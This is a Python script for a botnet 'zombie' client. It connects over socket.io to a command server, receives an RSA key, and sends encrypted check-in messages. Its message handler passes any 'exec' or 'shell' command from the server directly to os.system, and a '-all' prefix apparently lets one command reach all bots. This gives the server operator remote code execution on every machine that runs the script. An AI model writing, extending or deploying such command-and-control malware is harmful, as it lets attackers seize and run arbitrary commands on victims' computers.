import socketio
import os
import hashlib
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import json

sio = socketio.Client()
public_key = None

def send_encrypted_message(message):
    global public_key
    if public_key is None:
        print("Public key not received yet.")
        return

    cipher = PKCS1_OAEP.new(public_key)
    
    message_hash = hashlib.sha256(message.encode()).hexdigest()

    encrypted_chunks = []
    max_chunk_size = 214
    for i in range(0, len(message), max_chunk_size):
        chunk = message[i:i + max_chunk_size]
        encrypted_chunk = cipher.encrypt(chunk.encode())
        encrypted_chunks.append(encrypted_chunk.hex())

    data = {
        'encrypted_message': encrypted_chunks,
        'message_hash': message_hash
    }

    sio.emit('message', json.dumps(data))

@sio.event
def public_key_received(data):
    global public_key
    public_key = RSA.import_key(data)
    print("Public key received.")
    send_encrypted_message('message Hello from zombie!')

@sio.event
def connect():
    print('Connection established')

def ping(args):
    send_encrypted_message('message Pinged zombie!')

def shell(args):
    return os.system(' '.join(args[1:]))

@sio.event
def message(data):
    command = data.split(' ')
    commands = [
        {
            'name': ['ping', 'check', 'hello'],
            'callback': ping,
        },
        {
            'name': ['exec', 'shell'],
            'callback': shell,
        }
    ]
    for cmd in commands:
        if command[0].replace('-all', '') in cmd['name']:
            cmd['callback'](command)

@sio.event
def disconnect():
    print('Disconnected from server')

def main():
    sio.connect('http://localhost:3000')
    sio.wait()

if __name__ == '__main__':
    main()
